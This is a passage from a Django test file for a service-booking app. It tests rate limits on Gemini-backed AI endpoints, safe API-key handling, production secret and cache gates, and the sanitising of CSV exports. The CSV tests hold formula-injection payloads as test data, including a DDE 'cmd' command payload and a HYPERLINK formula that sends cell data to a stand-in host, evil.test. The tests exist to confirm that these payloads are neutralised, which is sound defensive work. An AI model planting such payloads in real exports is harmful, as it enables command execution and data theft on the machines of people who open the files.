        service_request.refresh_from_db()
        self.assertNotEqual(service_request.status, 'PUBLISHED')
        self.assertIsNone(service_request.published_service_id)

        # The deactivated service must NOT be silently reactivated.
        inactive.refresh_from_db()
        self.assertFalse(inactive.is_active)

    def test_inactive_service_publish_shows_a_clear_message(self):
        self._retired_service()
        service_request = self._request(name='Solar Installation')

        response = self._publish(service_request)

        shown = ' '.join(str(m) for m in response.context['messages'])
        self.assertIn('deactivated', shown.lower())
        self.assertIn('Solar Installation', shown)

    def test_refused_publish_does_not_relink_the_worker(self):
        """The worker must not be pointed at an unusable service."""
        self._retired_service()
        service_request = self._request(name='Solar Installation')

        self._publish(service_request)

        self.worker.refresh_from_db()
        self.assertIsNone(
            self.worker.service_id,
            'worker was linked to a deactivated, unusable service',
        )

    def test_refused_publish_sends_no_false_success_notification(self):
        self._retired_service()
        service_request = self._request(name='Solar Installation')

        self._publish(service_request)

        self.assertFalse(
            Notification.objects.filter(
                recipient=self.worker.user,
                message__icontains='published',
            ).exists()
        )

    def test_request_stays_approved_so_the_admin_can_retry(self):
        self._retired_service()
        service_request = self._request(name='Solar Installation')

        self._publish(service_request)

        service_request.refresh_from_db()
        self.assertEqual(
            service_request.status, 'APPROVED',
            'request must remain retryable after a refusal',
        )

    def test_publish_succeeds_once_the_service_is_reactivated(self):
        service = self._retired_service()
        service_request = self._request(name='Solar Installation')

        # First attempt is refused.
        self.assertEqual(self._publish(service_request).status_code, 200)

        # Admin reactivates via the normal edit form, then retries.
        service.is_active = True
        service.save(update_fields=['is_active'])

        response = self._publish(service_request)

        self.assertEqual(response.status_code, 302)
        service_request.refresh_from_db()
        self.assertEqual(service_request.status, 'PUBLISHED')
        self.assertEqual(service_request.published_service_id, service.id)

    def test_no_published_request_can_reference_an_inactive_service(self):
        """The end-state invariant, regardless of path taken."""
        inactive = self._retired_service()
        service_request = self._request(name='Solar Installation')
        self._publish(service_request)

        self.assertFalse(
            ServiceRequest.objects.filter(
                status='PUBLISHED', published_service__is_active=False
            ).exists(),
            'a PUBLISHED request points at an inactive service',
        )
        self.assertFalse(
            WorkerProfile.objects.filter(service=inactive).exists(),
            'a worker is bound to an inactive service',
        )

    def test_only_approved_requests_can_be_published(self):
        for status in ('PENDING', 'REJECTED', 'PUBLISHED'):
            with self.subTest(status=status):
                service_request = self._request(
                    status=status, name=f'Solar {status}'
                )
                response = self._publish(service_request)
                self.assertEqual(response.status_code, 404)

    def test_non_admin_cannot_publish(self):
        _make_user('sr_customer')
        service_request = self._request(name='Solar Installation')

        self.client.login(username='sr_customer', password='Password123!')
        response = self._publish(service_request)

        self.assertEqual(response.status_code, 302)
        service_request.refresh_from_db()
        self.assertEqual(service_request.status, 'APPROVED')
        self.assertFalse(
            Service.objects.filter(name__iexact='Solar Installation').exists()
        )
class AiEndpointRateLimitTest(TestCase):
    """P1-11: the AI endpoints must be throttled server-side."""

    def setUp(self):
        from django.core.cache import cache
        cache.clear()
        self.addCleanup(cache.clear)

        self.customer = _make_user('ai_rl_user')
        self.service = Service.objects.create(
            name='AI Plumbing', description='leaks', price=600.00, is_active=True
        )
        self.worker = _make_worker('ai_rl_worker', self.service)
        self.url = reverse('ai_service_assistant')

    def _post(self, message='I need a plumber', client=None):
        client = client or self.client
        return client.post(self.url, {'message': message})

    def _wipe_session(self):
        """Attacker throws away cookies / session entirely."""
        self.client.cookies.clear()
        self.client.session.flush()
        self.client.get(reverse('login'))

    # --- 1. anonymous guest path makes NO Gemini call -----------------

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_anonymous_guest_path_makes_no_gemini_call(self, mock_gemini):
        self.client.logout()

        for message in ('hello', 'how are you', 'what services do you offer'):
            with self.subTest(message=message):
                response = self._post(message)
                self.assertEqual(response.status_code, 200)
                self.assertTrue(response.json()['success'])

        # Other requests also stay on the static "please log in" reply.
        response = self._post('I need a plumber urgently')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.json()['type'], 'login_required')

        self.assertEqual(
            mock_gemini.call_count, 0,
            'the guest path must never spend Gemini quota',
        )

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_guest_static_branches_still_work_after_the_fix(self, mock_gemini):
        self.client.logout()
        response = self._post('hello')
        self.assertEqual(response.status_code, 200)
        payload = response.json()
        self.assertEqual(payload['type'], 'chat')
        self.assertIn('Hello', payload['message'])
        self.assertEqual(mock_gemini.call_count, 0)

    # --- 2/3/4. authenticated throttling + session-wipe bypass ---------

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_authenticated_requests_are_throttled(self, mock_gemini):
        mock_gemini.return_value = 'Plumbing'
        self.client.login(username='ai_rl_user', password='Password123!')

        from lamoapp.rate_limit import AI_ASSISTANT_PER_MINUTE
        for _ in range(AI_ASSISTANT_PER_MINUTE):
            response = self._post()
            self.assertNotEqual(response.status_code, 429)

        blocked = self._post()
        self.assertEqual(blocked.status_code, 429)

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_rate_limit_survives_session_wipe(self, mock_gemini):
        mock_gemini.return_value = 'Plumbing'
        self.client.login(username='ai_rl_user', password='Password123!')

        from lamoapp.rate_limit import AI_ASSISTANT_PER_MINUTE
        for _ in range(AI_ASSISTANT_PER_MINUTE):
            self._post()

        # Attacker's best move: discard the session completely.
        self._wipe_session()
        self.client.login(username='ai_rl_user', password='Password123!')

        response = self._post()
        self.assertEqual(
            response.status_code, 429,
            'deleting the session must not reset the AI quota',
        )

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_throttle_survives_full_cookie_deletion(self, mock_gemini):
        """A brand new anonymous client from the same IP is still bounded."""
        from lamoapp.rate_limit import AI_ASSISTANT_PER_MINUTE

        for _ in range(AI_ASSISTANT_PER_MINUTE):
            self._post()

        fresh = Client()
        response = fresh.post(self.url, {'message': 'hello'})
        self.assertEqual(response.status_code, 429)

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_returns_429_after_the_limit(self, mock_gemini):
        mock_gemini.return_value = 'Plumbing'
        self.client.login(username='ai_rl_user', password='Password123!')

        from lamoapp.rate_limit import AI_ASSISTANT_PER_MINUTE
        for _ in range(AI_ASSISTANT_PER_MINUTE + 1):
            response = self._post()

        self.assertEqual(response.status_code, 429)
        self.assertFalse(response.json()['success'])
        self.assertEqual(response.json()['type'], 'rate_limited')

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_retry_after_header_is_present(self, mock_gemini):
        mock_gemini.return_value = 'Plumbing'
        self.client.login(username='ai_rl_user', password='Password123!')

        from lamoapp.rate_limit import AI_ASSISTANT_PER_MINUTE
        for _ in range(AI_ASSISTANT_PER_MINUTE + 1):
            response = self._post()

        self.assertIn('Retry-After', response)
        self.assertGreaterEqual(int(response['Retry-After']), 1)

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_rate_limited_response_leaks_no_internals(self, mock_gemini):
        from lamoapp.rate_limit import AI_ASSISTANT_PER_MINUTE
        for _ in range(AI_ASSISTANT_PER_MINUTE + 1):
            response = self._post()

        body = response.content.decode('utf-8').lower()
        for leak in ('cache', 'ratelimit', 'redis', 'locmem', 'gemini', 'key='):
            self.assertNotIn(leak, body)

    # --- 6. ai_recommend_workers throttling ---------------------------

    def _recommend(self):
        return self.client.post(
            reverse('ai_recommend_workers', args=[self.service.id]),
            {'requirement': 'Kitchen tap is leaking', 'district': 'Ernakulam'},
            HTTP_X_REQUESTED_WITH='XMLHttpRequest',
        )

    def test_ai_recommend_workers_is_throttled(self):
        self.client.login(username='ai_rl_user', password='Password123!')

        from lamoapp.rate_limit import AI_RECOMMEND_PER_MINUTE
        for _ in range(AI_RECOMMEND_PER_MINUTE):
            self.assertNotEqual(self._recommend().status_code, 429)

        blocked = self._recommend()
        self.assertEqual(blocked.status_code, 429)
        self.assertIn('Retry-After', blocked)

    def test_ai_recommend_valid_requests_below_limit_work(self):
        self.client.login(username='ai_rl_user', password='Password123!')
        response = self._recommend()
        self.assertEqual(response.status_code, 200)
        payload = response.json()
        self.assertTrue(payload['success'])
        self.assertGreater(len(payload['recommendations']), 0)

    def test_ai_recommend_throttle_survives_session_wipe(self):
        self.client.login(username='ai_rl_user', password='Password123!')

        from lamoapp.rate_limit import AI_RECOMMEND_PER_MINUTE
        for _ in range(AI_RECOMMEND_PER_MINUTE):
            self._recommend()

        self._wipe_session()
        self.client.login(username='ai_rl_user', password='Password123!')

        self.assertEqual(self._recommend().status_code, 429)

    # --- 8. existing authentication requirement intact -----------------

    def test_ai_recommend_workers_still_requires_login(self):
        self.client.logout()
        response = self._recommend()
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse('login'), response['Location'])

    def test_ai_assistant_remains_open_to_guests(self):
        """The intentional anonymous experience must NOT be gated."""
        self.client.logout()
        response = self._post('hello')
        self.assertEqual(response.status_code, 200)
        self.assertNotIn('Location', response)
class GeminiApiKeyTest(TestCase):
    """P1-11: the key must travel in a header, and errors must be logged safely."""

    REAL_KEY = 'AIzaSyD-EXAMPLE-abcdefghijklmnopqrstuvwxyz012345'

    def _fake_response(self, text='Plumbing'):
        import io
        import json

        body = json.dumps({
            'candidates': [{'content': {'parts': [{'text': text}]}}]
        }).encode('utf-8')

        class _Resp(io.BytesIO):
            def __enter__(self_inner):
                return self_inner

            def __exit__(self_inner, *a):
                return False

        return _Resp(body)

    def test_api_key_is_NOT_in_the_request_url(self):
        """The key must never reach the URL / proxy access logs."""
        import urllib.request

        from lamoapp.ai_utils import _call_gemini_api

        captured = {}

        def fake_urlopen(req, timeout=None):
            captured['url'] = req.full_url
            captured['headers'] = dict(req.headers)
            return self._fake_response()

        with override_settings(GOOGLE_API_KEY=self.REAL_KEY):
            with patch('urllib.request.urlopen', side_effect=fake_urlopen):
                result = _call_gemini_api('hello')

        self.assertEqual(result, 'Plumbing')
        self.assertNotIn(self.REAL_KEY, captured['url'])
        self.assertNotIn('key=', captured['url'])
        self.assertNotIn('?', captured['url'])

    def test_api_key_IS_sent_as_x_goog_api_key_header(self):
        import urllib.request

        from lamoapp.ai_utils import _call_gemini_api

        captured = {}

        def fake_urlopen(req, timeout=None):
            captured['headers'] = {k.lower(): v for k, v in req.header_items()}
            return self._fake_response()

        with override_settings(GOOGLE_API_KEY=self.REAL_KEY):
            with patch('urllib.request.urlopen', side_effect=fake_urlopen):
                _call_gemini_api('hello')

        self.assertEqual(captured['headers'].get('x-goog-api-key'), self.REAL_KEY)

    def test_source_code_has_no_query_string_key(self):
        from pathlib import Path

        source = Path(
            settings.BASE_DIR, 'lamoapp', 'ai_utils.py'
        ).read_text(encoding='utf-8')
        self.assertNotIn('?key=', source)
        self.assertNotIn('f"?key=', source)
        self.assertIn('x-goog-api-key', source)

    # --- fallback behaviour preserved ---------------------------------

    def test_missing_key_preserves_fallback(self):
        from lamoapp.ai_utils import _call_gemini_api

        with override_settings(GOOGLE_API_KEY=''):
            with patch('urllib.request.urlopen') as mock_open:
                self.assertIsNone(_call_gemini_api('hello'))
                mock_open.assert_not_called()

    def test_short_placeholder_key_preserves_fallback(self):
        from lamoapp.ai_utils import _call_gemini_api

        with override_settings(GOOGLE_API_KEY='placeholder'):
            with patch('urllib.request.urlopen') as mock_open:
                self.assertIsNone(_call_gemini_api('hello'))
                mock_open.assert_not_called()

    # --- safe error logging -------------------------------------------

    def test_http_error_is_logged_without_the_key(self):
        import urllib.error

        from lamoapp.ai_utils import _call_gemini_api

        error = urllib.error.HTTPError(
            url='https://example.invalid', code=429, msg='quota exceeded',
            hdrs=None, fp=None,
        )

        with override_settings(GOOGLE_API_KEY=self.REAL_KEY):
            with patch('urllib.request.urlopen', side_effect=error):
                with self.assertLogs('lamoapp.ai_utils', level='WARNING') as captured:
                    result = _call_gemini_api('hello')

        self.assertIsNone(result, 'existing fallback must be preserved')
        log_text = '\n'.join(captured.output)
        self.assertIn('gemini_http_error', log_text)
        self.assertIn('429', log_text)
        self.assertNotIn(self.REAL_KEY, log_text)

    def test_generic_error_is_logged_without_the_key(self):
        from lamoapp.ai_utils import _call_gemini_api

        # Exception message deliberately contains the key and a request body.
        boom = RuntimeError(
            f'failed calling with key={self.REAL_KEY} body={{"text":"secret"}}'
        )

        with override_settings(GOOGLE_API_KEY=self.REAL_KEY):
            with patch('urllib.request.urlopen', side_effect=boom):
                with self.assertLogs('lamoapp.ai_utils', level='WARNING') as captured:
                    result = _call_gemini_api('hello')

        self.assertIsNone(result)
        log_text = '\n'.join(captured.output)
        self.assertIn('gemini_request_failed', log_text)
        self.assertIn('RuntimeError', log_text)
        self.assertNotIn(self.REAL_KEY, log_text)
        self.assertNotIn('secret', log_text)

    def test_gemini_failure_does_not_500_the_assistant_endpoint(self):
        import urllib.error

        from lamoapp.views import send_otp_email  # noqa: F401 - import sanity

        _make_user('ai_err_user')
        self.client.login(username='ai_err_user', password='Password123!')

        error = urllib.error.HTTPError(
            url='https://example.invalid', code=503, msg='unavailable',
            hdrs=None, fp=None,
        )

        with override_settings(GOOGLE_API_KEY=self.REAL_KEY):
            with patch('urllib.request.urlopen', side_effect=error):
                response = self.client.post(
                    reverse('ai_service_assistant'),
                    {'message': 'I need a plumber for a leaking tap'},
                )

        # A Gemini outage degrades to the DB fallback, never a 500.
        self.assertEqual(response.status_code, 200)
class CsvFormulaInjectionTest(TestCase):
    """P1-12: exported cells must never be interpreted as formulas."""

    def setUp(self):
        self.admin = _make_user('csv_admin', role='ADMIN')
        self.client.login(username='csv_admin', password='Password123!')

    # --- unit level: _stringify / _sanitize_csv_cell -------------------

    def test_equals_formula_is_neutralised(self):
        self.assertEqual(_stringify('=SUM(1,2)'), "'=SUM(1,2)")

    def test_plus_formula_is_neutralised(self):
        self.assertEqual(_stringify('+1234567890'), "'+1234567890")

    def test_at_formula_is_neutralised(self):
        self.assertEqual(_stringify('@SUM(A1:A9)'), "'@SUM(A1:A9)")

    def test_minus_formula_is_neutralised(self):
        self.assertEqual(_stringify('-1+cmd|\' /C calc\'!A0'), "'-1+cmd|\' /C calc\'!A0")

    def test_dde_payload_is_neutralised(self):
        payload = '=cmd|\' /C calc\'!A0'
        self.assertTrue(_stringify(payload).startswith("'"))

    def test_leading_whitespace_and_control_variants_are_neutralised(self):
        """Excel strips leading noise before deciding on a formula."""
        variants = [
            ' =1+1',
            '\t=1+1',
            '\r=1+1',
            '\n=1+1',
            '\x00=1+1',
            '\x0b=1+1',
            '\xa0=1+1',
            '   @SUM(1)',
            '\t\t-2+2',
            '\r\n+1',
        ]
        for raw in variants:
            with self.subTest(raw=repr(raw)):
                out = _stringify(raw)
                self.assertTrue(
                    out.startswith("'"),
                    f'{raw!r} was not neutralised -> {out!r}',
                )
                # The original payload is still readable after the marker.
                self.assertTrue(out.lstrip("'").endswith(raw.lstrip('\t\r\n\x00\x0b\xa0 ')) or raw.lstrip() in out)

    def test_normal_negative_number_is_NOT_escaped(self):
        self.assertEqual(_stringify(Decimal('-123.45')), '-123.45')
        self.assertEqual(_stringify(-500), '-500')
        self.assertEqual(_stringify(-1.5), '-1.5')

    def test_normal_text_is_untouched(self):
        for value in ('Plumbing', 'COMPLETED', 'Ernakulam', 'Suresh Kumar', 'a-b'):
            with self.subTest(value=value):
                self.assertEqual(_stringify(value), value)

    def test_values_containing_triggers_mid_string_are_untouched(self):
        """Only a *leading* trigger matters; 'a=b' is harmless text."""
        for value in ('a=b', 'x+y', 'user@example.com', 'C:/path/file'):
            with self.subTest(value=value):
                self.assertEqual(_stringify(value), value)

    def test_commas_quotes_and_multiline_are_preserved(self):
        self.assertEqual(_stringify('Kochi, Kerala'), 'Kochi, Kerala')
        self.assertEqual(_stringify('He said "hi"'), 'He said "hi"')
        self.assertEqual(_stringify('line one\nline two'), 'line one\nline two')

    def test_unicode_is_preserved(self):
        for value in ('à´•àµ‡à´°à´³à´‚', 'à¤®à¥à¤‚à¤¬à¤ˆ', 'cafÃ©', 'æ—¥æœ¬èªž', 'ÃœnÃ¯cÃ¶dÃ©'):
            with self.subTest(value=value):
                self.assertEqual(_stringify(value), value)

    def test_none_and_booleans_are_unchanged(self):
        self.assertEqual(_stringify(None), '')
        self.assertEqual(_stringify(True), 'Yes')
        self.assertEqual(_stringify(False), 'No')

    def test_whitespace_only_value_is_not_escaped(self):
        """`'' in '=+-@'` is True in Python - blanks must not gain an apostrophe."""
        for value in ('', '   ', '\t', '\r\n', '\xa0', ' \t\r\n '):
            with self.subTest(value=repr(value)):
                self.assertEqual(_stringify(value), value)

    def test_sanitizer_is_idempotent_no_double_quoting(self):
        once = _stringify('=1+1')
        twice = _stringify(once)
        self.assertEqual(once, twice)
        self.assertEqual(twice.count("'"), 1)

    def test_dates_and_ids_are_untouched(self):
        import datetime
        self.assertEqual(
            _stringify(datetime.date(2026, 9, 30)), '2026-09-30'
        )
        self.assertEqual(_stringify(datetime.datetime(2026, 9, 30, 12, 0)), '2026-09-30 12:00:00')
        self.assertEqual(_stringify(42), '42')
class CsvExportEndToEndTest(TestCase):
    """P1-12: the real admin export must be safe AND still valid CSV."""

    def setUp(self):
        self.admin = _make_user('e2e_admin', role='ADMIN')
        self.customer = _make_user('e2e_customer')
        self.service = Service.objects.create(
            name='Plumbing', description='pipes', price=500.00, is_active=True
        )
        self.worker = _make_worker('e2e_worker', self.service)
        self.client.login(username='e2e_admin', password='Password123!')

    def _export(self, dataset):
        response = self.client.get(reverse('admin_export_csv', args=[dataset]))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response['Content-Type'], 'text/csv')
        return response

    def _rows(self, response):
        import csv as csv_module
        import io as io_module
        text = response.content.decode('utf-8')
        return list(csv_module.reader(io_module.StringIO(text)))

    def _booking(self):
        return Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date='2026-09-30',
            time='10:00-12:00',
            start_time='10:00:00',
            end_time='12:00:00',
            location='Ernakulam',
            phone='9876543210',
            status='COMPLETED',
            estimated_cost='500.00',
        )

    def _complaint(self, **kwargs):
        defaults = dict(
            customer=self.customer,
            subject='Late arrival',
            description='The worker arrived three hours late.',
            status='OPEN',
        )
        defaults.update(kwargs)
        return Complaint.objects.create(booking=self._booking(), **defaults)

    def _enquiry(self, **kwargs):
        defaults = dict(
            name='Test Person', email='t@example.com', phone='9876543210',
            subject='Cannot book', message='My booking was rejected twice.',
        )
        defaults.update(kwargs)
        return ContactEnquiry.objects.create(**defaults)

    # --- malicious content in real user-controlled fields ---------------

    def test_complaint_subject_and_description_are_neutralised(self):
        payload = '=HYPERLINK("http://evil.test?d="&A1,"Click")'
        self._complaint(subject=payload, description='@SUM(1+1)*cmd')

        response = self._export('complaints')
        rows = self._rows(response)
        header = rows[0]

        self.assertTrue(rows[1][header.index('Subject')].startswith("'"))
        self.assertTrue(rows[1][header.index('Description')].startswith("'"))

    def test_contact_enquiry_all_text_fields_are_neutralised(self):
        self._enquiry(
            name='=cmd|\' /C calc\'!A0',
            email='+1-555-0100@x',
            phone='-1234567890',
            subject='@SUM(1)',
            message='\t=1+1\nSecond line',
        )

        rows = self._rows(self._export('enquiries'))
        header = rows[0]
        for column in ('Name', 'Email', 'Phone', 'Subject', 'Message'):
            with self.subTest(column=column):
                self.assertTrue(
                    rows[1][header.index(column)].startswith("'"),
                    '{0} not neutralised'.format(column),
                )

    def test_admin_remark_is_neutralised(self):
        self._complaint(admin_remark='=HYPERLINK("http://evil.test","x")')
        rows = self._rows(self._export('complaints'))
        self.assertTrue(rows[1][rows[0].index('Admin Remark')].startswith("'"))

    def test_username_is_neutralised(self):
        attacker = CustomUser.objects.create_user(
            username='+evil', email='evil@test.com',
            password='Password123!', role='USER',
        )
        Complaint.objects.create(
            booking=self._booking(),
            customer=attacker,
            subject='Late arrival',
            description='Arrived late.',
            status='OPEN',
        )
        rows = self._rows(self._export('complaints'))
        self.assertTrue(rows[1][rows[0].index('Customer')].startswith("'"))
# --- valid CSV structure preserved ---------------------------------

    def test_csv_is_valid_and_parseable(self):
        self._complaint(
            subject='Worker was late, and rude',
            description='Line one\nLine two, with a comma',
        )
        rows = self._rows(self._export('complaints'))

        self.assertEqual(rows[0][0], 'Complaint ID')
        self.assertEqual(len(rows), 2, 'header + exactly one data row')
        self.assertEqual(len(rows[0]), len(rows[1]), 'ragged rows')

    def test_commas_quotes_multiline_and_unicode_survive(self):
        original = 'Kochi, Kerala â€” "urgent"\nà´•àµ‡à´°à´³à´‚'
        self._complaint(description=original)

        rows = self._rows(self._export('complaints'))
        value = rows[1][rows[0].index('Description')]

        self.assertEqual(value, original, 'round-trip through CSV lost data')

    def test_normal_negative_amount_is_preserved_as_a_number(self):
        booking = self._booking()
        Payment.objects.create(
            booking=booking, amount=Decimal('-250.00'),
            status='REFUNDED', payment_method='UPI', gateway='manual',
        )
        rows = self._rows(self._export('payments'))
        value = rows[1][rows[0].index('Amount')]

        self.assertEqual(value, '-250.00')
        self.assertFalse(value.startswith("'"), 'a real number was escaped')
        self.assertLess(float(value), 0, 'must remain numeric in a spreadsheet')

    def test_ordinary_export_needs_no_sanitizing(self):
        self._complaint(subject='Late arrival', description='Arrived late.')
        for row in self._rows(self._export('complaints'))[1:]:
            for cell in row:
                self.assertFalse(cell.startswith("'"), 'unexpected escape: %r' % cell)

    # --- permissions / response behaviour preserved --------------------

    def test_non_admin_cannot_export(self):
        self.client.logout()
        self.client.login(username='e2e_customer', password='Password123!')
        response = self.client.get(
            reverse('admin_export_csv', args=['complaints'])
        )
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse('dashboard'), response['Location'])

    def test_unknown_dataset_is_404(self):
        response = self.client.get(reverse('admin_export_csv', args=['secrets']))
        self.assertEqual(response.status_code, 404)

    def test_filename_and_disposition_preserved(self):
        response = self._export('complaints')
        disposition = response['Content-Disposition']
        self.assertIn('attachment;', disposition)
        self.assertIn('lamo-complaints-', disposition)
        self.assertTrue(disposition.endswith('.csv"'))

    def test_all_four_datasets_export_successfully(self):
        self._booking()
        self._complaint()
        self._enquiry()
        Payment.objects.create(
            booking=Booking.objects.first(), amount=Decimal('500.00'),
            status='PAID', payment_method='UPI', gateway='manual',
        )
        for dataset in ('bookings', 'payments', 'complaints', 'enquiries'):
            with self.subTest(dataset=dataset):
                rows = self._rows(self._export(dataset))
                self.assertGreaterEqual(len(rows), 2)

    def test_no_exported_cell_can_become_a_formula(self):
        """Simulates how a spreadsheet evaluates each parsed cell."""
        self._complaint(subject='=1+1', description='\t=2+2')
        self._enquiry(name='-3+3', subject='@x', message='=cmd')

        for dataset in ('complaints', 'enquiries'):
            for row in self._rows(self._export(dataset))[1:]:
                for cell in row:
                    probe = cell.lstrip('\t\r\n\x0b\x0c\x00\xa0 ')
                    if not probe:
                        continue  # blank cell, nothing to evaluate
                    self.assertNotIn(
                        probe[0], '=+-@',
                        '%s: cell would evaluate as a formula: %r'
                        % (dataset, cell),
                    )
# ============================================================
# BATCH 1 - PRODUCTION CONFIGURATION GATES
# ============================================================
# P0-B (shared cache) and P0-C (secret key) live in settings.py and are
# evaluated while Django is importing settings, so they cannot be exercised
# with override_settings(). The pure resolver functions are imported instead
# and called with the raw environment value and the DJANGO_ENV value - exactly
# the inputs the gates receive at import time.
#
# No migrations and no database rows are involved, so SimpleTestCase is right.


class ProductionSecretKeyTest(SimpleTestCase):
    """P0-C: a production process must never boot with a weak or known secret."""

    # Realistic value: `secrets.token_urlsafe(50)` yields 67 characters.
    GOOD_SECRET = 'Ab3-_x9Kq7Zm2pQvT8sLwR4nYc6Bd1FgHjK0lXzA3eU5iO7tP9qWs' * 2

    def test_production_with_missing_secret_fails(self):
        for raw in (None, '', '   '):
            with self.subTest(raw=raw):
                with self.assertRaises(ImproperlyConfigured):
                    resolve_secret_key(raw, 'production')

    def test_production_with_dev_fallback_secret_fails(self):
        with self.assertRaises(ImproperlyConfigured):
            resolve_secret_key(_DEV_SECRET_KEY, 'production')

    def test_production_with_short_secret_fails(self):
        # The placeholder shipped in .env.example must not be accepted.
        with self.assertRaises(ImproperlyConfigured):
            resolve_secret_key('change-me-to-a-long-random-string', 'production')

    def test_production_with_valid_secret_succeeds(self):
        self.assertEqual(
            resolve_secret_key(self.GOOD_SECRET, 'production'), self.GOOD_SECRET
        )

    def test_development_without_secret_keeps_existing_behaviour(self):
        # Local development must still boot with the dev fallback.
        self.assertEqual(resolve_secret_key(None, 'development'), _DEV_SECRET_KEY)
        self.assertEqual(resolve_secret_key('', 'development'), _DEV_SECRET_KEY)

    def test_development_with_env_secret_uses_it(self):
        self.assertEqual(
            resolve_secret_key(self.GOOD_SECRET, 'development'), self.GOOD_SECRET
        )

class ProductionSharedCacheTest(SimpleTestCase):
    """P0-B: production must never silently fall back to a per-process cache."""

    def test_production_without_cache_url_fails(self):
        for raw in (None, '', '   '):
            with self.subTest(raw=raw):
                with self.assertRaises(ImproperlyConfigured):
                    resolve_cache_config(raw, 'production')

    def test_production_with_redis_is_accepted(self):
        url = 'redis://:password@cache.internal:6379/0'
        config = resolve_cache_config(url, 'production')
        self.assertEqual(
            config['default']['BACKEND'],
            'django.core.cache.backends.redis.RedisCache',
        )
        self.assertEqual(config['default']['LOCATION'], url)

    def test_production_with_rediss_and_memcached_are_accepted(self):
        self.assertEqual(
            resolve_cache_config('rediss://h:6379/1', 'production')['default']['BACKEND'],
            'django.core.cache.backends.redis.RedisCache',
        )
        self.assertEqual(
            resolve_cache_config('memcached://h:11211', 'production')['default']['BACKEND'],
            'django.core.cache.backends.memcached.PyMemcacheCache',
        )

    def test_unsupported_scheme_never_downgrades_to_locmem(self):
        # The dangerous case is a typo silently becoming a per-process cache.
        for raw in ('locmem://x', 'http://cache:6379', 'garbage'):
            with self.subTest(raw=raw):
                with self.assertRaises(ImproperlyConfigured):
                    resolve_cache_config(raw, 'production')
                with self.assertRaises(ImproperlyConfigured):
                    resolve_cache_config(raw, 'development')

    def test_development_without_cache_url_uses_locmem(self):
        config = resolve_cache_config(None, 'development')
        self.assertEqual(
            config['default']['BACKEND'],
            'django.core.cache.backends.locmem.LocMemCache',
        )

    def test_development_with_redis_still_uses_redis(self):
        config = resolve_cache_config('redis://127.0.0.1:6379/0', 'development')
        self.assertEqual(
            config['default']['BACKEND'],
            'django.core.cache.backends.redis.RedisCache',
        )

    def test_cache_error_message_never_leaks_credentials(self):
        with self.assertRaises(ImproperlyConfigured) as caught:
            resolve_cache_config('locmem://user:s3cr3t@host', 'production')
        self.assertNotIn('s3cr3t', str(caught.exception))

    def test_test_settings_use_an_isolated_local_cache(self):
        # settings_test.py pins CACHES so the suite never needs a live Redis.
        self.assertEqual(
            settings.CACHES['default']['BACKEND'],
            'django.core.cache.backends.locmem.LocMemCache',
        )

    def test_requirements_pin_the_redis_client(self):
        requirements = Path(settings.BASE_DIR.parent, 'requirements.txt').read_text(
            encoding='utf-8'
        )
        self.assertRegex(requirements, r'(?m)^redis==')


class RateLimiterStillFunctionsTest(SimpleTestCase):
    """P0-B: the cache gates must not have broken the limiter that uses it."""

    def test_failure_counter_counts_and_locks_out(self):
        key = 'test-ratelimit:lockout'
        try:
            self.assertFalse(is_rate_limited(key, 3))
            for _ in range(3):
                locked, _remaining = register_failure(key, 3, 60)
            self.assertTrue(locked)
            self.assertTrue(is_rate_limited(key, 3))
        finally:
            clear(key)

    def test_clear_resets_the_counter(self):
        key = 'test-ratelimit:clear'
        try:
            for _ in range(3):
                register_failure(key, 3, 60)
            self.assertTrue(is_rate_limited(key, 3))
            clear(key)
            self.assertFalse(is_rate_limited(key, 3))
        finally:
            clear(key)

    def test_ai_quota_consumes_and_then_refuses(self):
        key = 'test-ratelimit:ai'
        try:
            allowed, retry_after = consume_ai_quota(key, 2, 60)
            self.assertTrue(allowed)
            self.assertEqual(retry_after, 0)

            consume_ai_quota(key, 2, 60)
            allowed, retry_after = consume_ai_quota(key, 2, 60)
            self.assertFalse(allowed)
            self.assertGreaterEqual(retry_after, 1)
        finally:
            clear(key)

    def test_window_is_fixed_not_sliding(self):
        """Repeated attempts must NOT push the window's expiry further out.

        The window used to be refreshed on every attempt (a sliding window), so
        a caller who kept retrying could never let the counter expire - once
        the limit was reached it stayed locked out indefinitely. The window is
        now fixed at ``window_seconds`` from the FIRST attempt, so retrying
        does not extend it.
        """
        key = 'test-ratelimit:fixed-window'
        try:
            # Trip the limit, then keep hammering it.
            for _ in range(5):
                register_attempt_within_window(key, 2, 60)

            remaining_after_hammering = lockout_seconds_remaining(key)

            # Hammering more must not extend the deadline.
            for _ in range(5):
                register_attempt_within_window(key, 2, 60)

            self.assertEqual(
                lockout_seconds_remaining(key),
                remaining_after_hammering,
            )
        finally:
            clear(key)

    def test_cache_keys_are_hashed_not_raw_identifiers(self):
        class _FakeRequest:
            META = {'REMOTE_ADDR': '203.0.113.5'}

        key = login_key(_FakeRequest(), 'victim@example.com')
        self.assertNotIn('victim@example.com', key)
        self.assertNotIn('203.0.113.5', key)

    def test_failure_message_never_leaks_the_secret(self):
        with self.assertRaises(ImproperlyConfigured) as caught:
            resolve_secret_key(_DEV_SECRET_KEY, 'production')
        # The message may name the variable, but must never print the key.
        self.assertNotIn(_DEV_SECRET_KEY, str(caught.exception))

    def test_settings_use_the_gate_rather_than_a_bare_fallback(self):
        # Guards against someone reintroducing `or _DEV_SECRET_KEY`, which
        # would silently bypass resolve_secret_key() in production.
        source = Path(settings.BASE_DIR, 'lamo', 'settings.py').read_text(
            encoding='utf-8'
        )
        self.assertIn('resolve_secret_key(os.getenv(', source)
        self.assertNotIn("SECRET_KEY = os.getenv('DJANGO_SECRET_KEY') or", source)

# ============================================================
# BATCH 2 - FUNCTIONAL / NAVIGATION / REGRESSION
# ============================================================
# Each test below corresponds to a concrete defect found in the end-to-end
# functional + UI audit and is named after the fix it protects.


class LoginUrlResolutionTest(SimpleTestCase):
    """Anonymous visitors must reach the sign-in page, not a 404.

